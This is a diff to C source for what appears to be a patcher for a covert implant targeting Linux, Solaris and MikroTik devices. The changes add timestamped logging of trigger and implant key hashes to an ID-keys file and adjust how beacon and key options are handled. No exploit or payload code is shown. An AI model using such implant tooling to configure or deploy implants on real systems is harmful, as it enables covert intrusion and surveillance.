@@ -44,6 +44,7 @@
 #define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
 
 #define ID_KEY_FILE	"ID-keys.txt"
+#define ID_KEY_DATETIME_FORMAT	"%4i/%2i/%2i %02i:%2i:%2i"
 
 #define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH
 
@@ -81,7 +82,7 @@ void printSha1Hash(FILE *file, char *label, unsigned char *sha1Hash)
 	int i = 0;
 
 	//Display Label
-	printf("%s", label);
+	fprintf(file, "%s", label);
 
 	//Display 40 hexadecimal number array
 	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
@@ -151,16 +152,18 @@ int main(int argc, char **argv)
 {
 	int optval;
 	//struct in_addr        addr_check;
-	int linux_x86 = 0;			// Linux x86
-	int solaris_sparc = 0;			// Solaris SPARC
-	int solaris_x86 = 0;			// Solaris x86
-	int mikrotik_x86 = 0;			// MikroTik x86
-	int mikrotik_mipsbe = 0;		// MikroTik MIPS Big Endian
-	int mikrotik_mipsle = 0;		// MikroTik MIPS Little Endian
-	int mikrotik_ppc = 0;			// MikroTik PowerPC [Big Endian]
-	int raw = 0;				// unpatched versions
-	char *host = (char *) NULL;		// cached hostname for user confirmation message
-	FILE *implantIDFile;			//Used to save implant keys and subsequent sha1 hashes...
+	int linux_x86 = 0;				// Linux x86
+	int solaris_sparc = 0;				// Solaris SPARC
+	int solaris_x86 = 0;				// Solaris x86
+	int mikrotik_x86 = 0;				// MikroTik x86
+	int mikrotik_mipsbe = 0;			// MikroTik MIPS Big Endian
+	int mikrotik_mipsle = 0;			// MikroTik MIPS Little Endian
+	int mikrotik_ppc = 0;				// MikroTik PowerPC [Big Endian]
+	int raw = 0;					// unpatched versions
+	char *host = (char *) NULL;			// cached hostname for user confirmation message
+	FILE *implantIDFile;				// Used to save implant keys and subsequent sha1 hashes...
+	time_t currentTime;				// Time stamp for ID key generation
+	struct tm *idKeyTime;				// Pointer to the ID key generation data structure
 	unsigned char implantKey[ID_KEY_HASH_SIZE];
 	unsigned char triggerKey[ID_KEY_HASH_SIZE];
 
@@ -226,10 +229,12 @@ int main(int argc, char **argv)
 			args.interval = (unsigned int) atoi(optarg) * 1000;
 			break;
 
-		case 'j':
+		case 'j':	// beacon jitter
 			args.jitter = (unsigned int) atoi(optarg);
 			break;
 
+			// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the text entered
+			// on the command line (-k option), or by reading the contents of the key file (using the -K option).
 		case 'K':
 			{	struct stat	statbuf;
 
@@ -243,14 +248,32 @@ int main(int argc, char **argv)
 					return -1;
 				}
 				if (stat(optarg, &statbuf) != 0) {
-					perror("Cannot stat key file");
+					perror("Cannot obtain key file attributes.");
 					return -1;
 				}
+
+				implantIDFile = fopen(ID_KEY_FILE, "a+");	// Open file to save implant keys and associated SHA1 hashes
+				if (implantIDFile == NULL) {
+					printf("Unable to save implantID information into the idKeys.txt file.\n");
+					return -1;
+				}
+
+				currentTime = time(NULL);
+				idKeyTime = gmtime(&currentTime);
+				fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",
+					idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday, idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);	// Record the ID key time and text
+
 				if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 			// Validate that the key text in the file is of sufficient length
 					sha1_file((const char *)optarg, triggerKey);		// Generate the trigger key from the key file
 					D(printSha1Hash (stdout, "Trigger Key", triggerKey));
 
 					sha1(triggerKey, ID_KEY_HASH_SIZE, implantKey);		// Generate the implant key
+					printSha1Hash(implantIDFile, "\t", triggerKey);
+					printSha1Hash(implantIDFile, "\t", implantKey);		// Record the implant key
+
+					fprintf(implantIDFile, "\n");				// Close the record file
+					fclose(implantIDFile);
+					memcpy(args.idKey, implantKey, sizeof(args.idKey));	// Copy the implant key to the patched args
 					D(printSha1Hash (stdout, "Implant Key", implantKey));
 					D(printf("\n\n\n" ));
 				} else {
@@ -261,9 +284,7 @@ int main(int argc, char **argv)
 				break;
 			}
 
-		case 'k':	// ID Key Phrase used for sha1 hash that is stored in idKey
-			// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the
-			// text entered on the command line or by reading the key file (using option -K).
+		case 'k':
 
 			if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
 				fprintf(stderr, "ERROR: Only one key option (-k or -K) can be used.\n");
@@ -280,7 +301,11 @@ int main(int argc, char **argv)
 				printf("Unable to save implantID information into the idKeys.txt file.\n");
 				return -1;
 			}
-			fprintf(implantIDFile, "%s", optarg);					// Record the ID key text
+
+			currentTime = time(NULL);
+			idKeyTime = gmtime(&currentTime);
+			fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",
+				idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday, idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);	// Record the ID key time and text
 			D(printf("\n\n\n DEBUG: keyPhrase=%s \n", optarg));
 
 			sha1((const unsigned char *) optarg, strlen(optarg), triggerKey);	// Compute trigger key
